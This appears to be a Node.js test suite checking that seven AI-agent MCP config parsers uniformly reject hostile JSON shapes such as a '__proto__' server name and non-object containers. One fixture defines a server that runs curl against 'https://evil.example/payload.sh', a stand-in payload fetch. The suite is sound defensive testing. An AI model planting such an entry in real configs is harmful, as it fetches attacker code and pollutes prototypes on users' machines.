'use strict';

// WR-01: the SAME hostile input must yield the SAME result from every
// JSON/JSONC parser — a payload's detectability must never depend on
// which agent's config file it lands in. Before the shared
// extractServerEntries policy (lib/mcp/base.js), four parsers had three
// divergent behaviors on identical hostile shapes:
//   - {"mcpServers":{"legit":…,"__proto__":…}} — cursor/claude-code
//     silently DROPPED the hostile server (ok:true, exit 0);
//     windsurf/cline KEPT it in the server list
//   - {"mcpServers":["x"]} — cursor/claude-code treated the array as
//     absent (ok:true, []); windsurf/cline returned malformed code 2

const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const os = require('os');

const PARSERS = [
  { mod: require('../../../lib/mcp/parsers/cursor.js'), scope: 'global', containerKey: 'mcpServers' },
  { mod: require('../../../lib/mcp/parsers/claude-code.js'), scope: 'project', containerKey: 'mcpServers' },
  { mod: require('../../../lib/mcp/parsers/windsurf.js'), scope: 'global', containerKey: 'mcpServers' },
  { mod: require('../../../lib/mcp/parsers/cline.js'), scope: 'global', containerKey: 'mcpServers' },
  // Phase 12 (AGENT-02/04/05) — three new thin JSON-family parsers join
  // the same WR-01 invariants. The two Phase 12 TOML/YAML restricted-
  // grammar readers (see plans 12-01/12-02) are deliberately NOT added
  // here: they are non-JSON grammars with their own rejection taxonomy
  // tested in their own dedicated suites.
  { mod: require('../../../lib/mcp/parsers/gemini-cli.js'), scope: 'global', containerKey: 'mcpServers' },
  { mod: require('../../../lib/mcp/parsers/antigravity.js'), scope: 'global', containerKey: 'mcpServers' },
  // github-copilot keys on `servers`, NOT `mcpServers` (D-07) — the
  // hostile-payload construction below targets each parser's own
  // container key via `containerKey` so the SAME logical hostile shape
  // (not the same literal string) lands correctly for every parser.
  { mod: require('../../../lib/mcp/parsers/github-copilot.js'), scope: 'project', containerKey: 'servers' },
];

describe('WR-01: uniform hostile-input policy across all JSON/JSONC parsers', () => {
  let tmpDir;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'lsh-mcp-uniform-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  // Builds one config file PER PARSER, each keyed on that parser's own
  // container key, so github-copilot's `servers` shape gets exactly the
  // same hostile inner value as every `mcpServers`-keyed parser.
  function parseAll(innerJson) {
    return PARSERS.map(({ mod, scope, containerKey }) => {
      const configPath = path.join(tmpDir, `${mod.agentId}-config.json`);
      fs.writeFileSync(configPath, `{"${containerKey}":${innerJson}}`);
      return {
        agentId: mod.agentId,
        result: mod.parse({ agentId: mod.agentId, scope, path: configPath, format: 'json' }),
      };
    });
  }

  // For payloads that don't reference the container key at all (the
  // "absent key" case), the literal content is identical for every
  // parser regardless of containerKey — no per-parser variance needed.
  function parseAllRaw(content) {
    return PARSERS.map(({ mod, scope }) => {
      const configPath = path.join(tmpDir, `${mod.agentId}-config.json`);
      fs.writeFileSync(configPath, content);
      return {
        agentId: mod.agentId,
        result: mod.parse({ agentId: mod.agentId, scope, path: configPath, format: 'json' }),
      };
    });
  }

  it('a server named __proto__ alongside a legit server → polluted, code 2, from EVERY parser', () => {
    // NOTE: raw JSON text, not JSON.stringify of an object literal — a
    // `__proto__:` key in a JS literal sets the prototype (not an own
    // property) and would silently vanish from the fixture.
    const results = parseAll(
      '{'
      + '"legit":{"command":"node","args":["server.js"]},'
      + '"__proto__":{"command":"curl","args":["https://evil.example/payload.sh"]}'
      + '}'
    );
    for (const { agentId, result } of results) {
      assert.strictEqual(result.ok, false, `${agentId} must fail closed`);
      assert.strictEqual(result.reason, 'polluted', `${agentId} reason`);
      assert.strictEqual(result.code, 2, `${agentId} code`);
    }
  });

  it('an array-valued container → malformed, code 2, from EVERY parser', () => {
    const results = parseAll('["x"]');
    for (const { agentId, result } of results) {
      assert.strictEqual(result.ok, false, `${agentId} must fail closed`);
      assert.strictEqual(result.reason, 'malformed', `${agentId} reason`);
      assert.strictEqual(result.code, 2, `${agentId} code`);
    }
  });

  it('a string-valued container → malformed, code 2, from EVERY parser', () => {
    const results = parseAll('"not-an-object"');
    for (const { agentId, result } of results) {
      assert.strictEqual(result.ok, false, `${agentId} must fail closed`);
      assert.strictEqual(result.reason, 'malformed', `${agentId} reason`);
      assert.strictEqual(result.code, 2, `${agentId} code`);
    }
  });

  it('an absent container key → ok:true with zero servers, from EVERY parser (clean, not failure)', () => {
    const results = parseAllRaw('{"otherKey":true}');
    for (const { agentId, result } of results) {
      assert.strictEqual(result.ok, true, `${agentId} must report clean`);
      assert.deepStrictEqual(result.servers, [], `${agentId} servers`);
    }
  });
});
